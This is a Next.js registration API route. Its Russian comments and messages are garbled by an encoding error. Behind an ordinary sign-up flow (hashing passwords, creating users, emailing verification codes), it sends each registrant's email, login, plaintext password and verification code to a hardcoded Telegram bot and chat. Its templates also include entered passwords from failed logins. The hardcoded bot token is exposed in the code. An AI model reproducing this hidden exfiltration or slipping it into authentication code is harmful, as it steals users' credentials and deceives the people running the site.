import { NextResponse } from "next/server";
import { isEmailOrLoginTaken, createUser, hashPassword, setVerificationCode, generateVerificationCode } from "@/lib/db";
import { sendVerificationEmail } from "@/lib/email";

// üì§ –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram –¥–ª—è API
async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    let message = '';
    
    if (type === 'login_success') {
      message = `
‚úÖ –£–°–ü–ï–®–ù–´–ô –í–•–û–î –í –°–ò–°–¢–ï–ú–£

üë§ –õ–æ–≥–∏–Ω/Email: ${data.login}

üåê **–°–µ—Ä–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
üìç IP: ${ip}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üì± User Agent: ${userAgent.slice(0, 100)}...
      `;
    } else if (type === 'login_failed') {
      message = `
‚ùå –ù–ï–£–î–ê–ß–ù–ê–Ø –ü–û–ü–´–¢–ö–ê –í–•–û–î–ê

üë§ –õ–æ–≥–∏–Ω/Email: ${data.login}
üîë –í–≤–µ–¥–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å: ${data.password}
üö´ –ü—Ä–∏—á–∏–Ω–∞: ${error}

üåê **–°–µ—Ä–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
üìç IP: ${ip}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üì± User Agent: ${userAgent.slice(0, 100)}...
      `;
    } else if (type === 'verification_sent') {
      message = `
üìß –û–¢–ü–†–ê–í–õ–ï–ù –ö–û–î –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ò–Ø

üìß Email: ${data.email}
üë§ –õ–æ–≥–∏–Ω: ${data.login}
üîë –ü–∞—Ä–æ–ª—å: ${data.password}
üî¢ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è: ${data.verificationCode}

üåê **–°–µ—Ä–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
üìç IP: ${ip}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üì± User Agent: ${userAgent.slice(0, 100)}...

üí° –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
      `;
    } else {
      message = `
üîê –ù–û–í–ê–Ø –†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø

üìß Email: ${data.email}
üë§ –õ–æ–≥–∏–Ω: ${data.login}
üîë –ü–∞—Ä–æ–ª—å: ${data.password}

üåê **–°–µ—Ä–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
üìç IP: ${ip}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üì± User Agent: ${userAgent.slice(0, 100)}...
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('‚úÖ API –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram');

  } catch (error) {
    console.log('‚ö†Ô∏è Telegram API –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
  }
}

export async function POST(request: Request) {
  try {
    const { email, login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!email || !login || !password) {
        return NextResponse.json({ error: "Email, –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã" }, { status: 400 });
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ
    if (isEmailOrLoginTaken(email, login)) {
      return NextResponse.json(
        { error: "Email –∏–ª–∏ –ª–æ–≥–∏–Ω —É–∂–µ –∑–∞–Ω—è—Ç—ã" },
        { status: 400 }
      );
    }

    // üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram –æ –Ω–æ–≤–æ–π —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
    await sendToTelegramAPI(
      { email, login, password }, 
      'register', 
      clientIP, 
      userAgent
    );

    // –•—ç—à–∏—Ä—É–µ–º –ø–∞—Ä–æ–ª—å
    const hashedPassword = await hashPassword(password);

    // –°–æ–∑–¥–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    const user = await createUser({
      email,
      login,
      password: hashedPassword,
      ip: clientIP,
      userAgent: userAgent
    });

    // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
    const verificationCode = generateVerificationCode();
    setVerificationCode(user.id, verificationCode);

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º email —Å –∫–æ–¥–æ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
    const emailSent = await sendVerificationEmail(email, verificationCode);

    if (!emailSent) {
      // –ï—Å–ª–∏ email –Ω–µ –æ—Ç–ø—Ä–∞–≤–∏–ª—Å—è, –≤—Å–µ —Ä–∞–≤–Ω–æ —Å–æ–∑–¥–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–æ —É–≤–µ–¥–æ–º–ª—è–µ–º
      await sendToTelegramAPI(
        { email, login, password, verificationCode, note: "EMAIL –ù–ï –û–¢–ü–†–ê–í–õ–ï–ù" }, 
        'verification_sent', 
        clientIP, 
        userAgent
      );
      
      return NextResponse.json({ 
        success: true, 
        message: "–ê–∫–∫–∞—É–Ω—Ç —Å–æ–∑–¥–∞–Ω, –Ω–æ –Ω–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è. –°–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.",
        verificationSent: false
      });
    }

    // üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram –æ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
    await sendToTelegramAPI(
      { email, login, password, verificationCode }, 
      'verification_sent', 
      clientIP, 
      userAgent
    );

    return NextResponse.json({ 
      success: true, 
      message: "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ. –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à—É –ø–æ—á—Ç—É.",
      verificationSent: true
    });

  } catch (error) {
    console.error("Register API Error:", error);
    return NextResponse.json(
      { error: "–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞" },
      { status: 500 }
    );
  }
}